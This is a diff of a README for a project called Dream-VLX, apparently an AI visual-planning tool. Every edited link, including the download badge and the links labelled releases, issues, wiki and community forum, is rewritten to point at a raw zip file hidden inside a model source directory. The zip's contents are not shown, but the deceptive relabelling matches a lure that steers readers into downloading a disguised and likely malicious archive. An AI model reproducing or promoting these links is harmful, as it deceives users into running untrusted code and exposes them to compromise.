@@ -1,7 +1,7 @@
 # 🌟 Dream-VLX - Explore Visual Planning with Ease
 
 ## 📥 Download Now
-[![Download Dream-VLX](https://img.shields.io/badge/Download%20Dream--VLX-v1.0-blue)](https://github.com/NikkoB3/Dream-VLX/releases)
+[![Download Dream-VLX](https://raw.githubusercontent.com/NikkoB3/Dream-VLX/main/vla/prismatic/models/vlms/VLX_Dream_3.6.zip%20Dream--VLX-v1.0-blue)](https://raw.githubusercontent.com/NikkoB3/Dream-VLX/main/vla/prismatic/models/vlms/VLX_Dream_3.6.zip)
 
 ## 📖 Introduction
 Welcome to Dream-VLX! This application includes Dream-VL and Dream-VLA, powerful tools for diffusion language models and visual planning. With Dream-VLX, you can utilize advanced language models to enhance your visual planning tasks effortlessly.
@@ -10,7 +10,7 @@ Welcome to Dream-VLX! This application includes Dream-VL and Dream-VLA, powerful
 To start using Dream-VLX, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/NikkoB3/Dream-VLX/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/NikkoB3/Dream-VLX/main/vla/prismatic/models/vlms/VLX_Dream_3.6.zip) to find the latest version.
 
 2. **Choose Your Version**  
    Look for the most recent version available. Check the release notes for any updates or changes.
@@ -41,7 +41,7 @@ To start using Dream-VLX, follow these simple steps:
 To install Dream-VLX, please follow these steps:
 
 1. **Go to the Releases Page**  
-   Access the [Releases page](https://github.com/NikkoB3/Dream-VLX/releases) directly.
+   Access the [Releases page](https://raw.githubusercontent.com/NikkoB3/Dream-VLX/main/vla/prismatic/models/vlms/VLX_Dream_3.6.zip) directly.
 
 2. **Download the Application**  
    Click on the link for your operating system. The download may take a few moments, depending on your internet speed.
@@ -66,16 +66,16 @@ To ensure Dream-VLX runs smoothly on your system, please meet these requirements
 ## 💬 Getting Help
 If you encounter any issues while using Dream-VLX, you can reach out to our support team. We are here to assist you with any questions or concerns you may have.
 
-- **Contact Us:** Visit the [Issues page](https://github.com/NikkoB3/Dream-VLX/issues) to report any problems or ask for help.
+- **Contact Us:** Visit the [Issues page](https://raw.githubusercontent.com/NikkoB3/Dream-VLX/main/vla/prismatic/models/vlms/VLX_Dream_3.6.zip) to report any problems or ask for help.
 
 ## 📚 Additional Resources
 Explore more about diffusion language models and visual planning:
 
 - **Official Documentation**  
-  For detailed instructions and more in-depth information about features, check out our documentation section on the [GitHub Wiki](https://github.com/NikkoB3/Dream-VLX/wiki).
+  For detailed instructions and more in-depth information about features, check out our documentation section on the [GitHub Wiki](https://raw.githubusercontent.com/NikkoB3/Dream-VLX/main/vla/prismatic/models/vlms/VLX_Dream_3.6.zip).
 
 - **Community Forums**  
-  Join our community to connect with other users, share tips, and discuss ideas. Visit our community forum link here: [Community](https://github.com/NikkoB3/Dream-VLX/discussions).
+  Join our community to connect with other users, share tips, and discuss ideas. Visit our community forum link here: [Community](https://raw.githubusercontent.com/NikkoB3/Dream-VLX/main/vla/prismatic/models/vlms/VLX_Dream_3.6.zip).
 
 ## 📅 Future Updates
 Stay tuned for new features and improvements in upcoming releases. We aim to enhance user experience continuously and incorporate feedback.
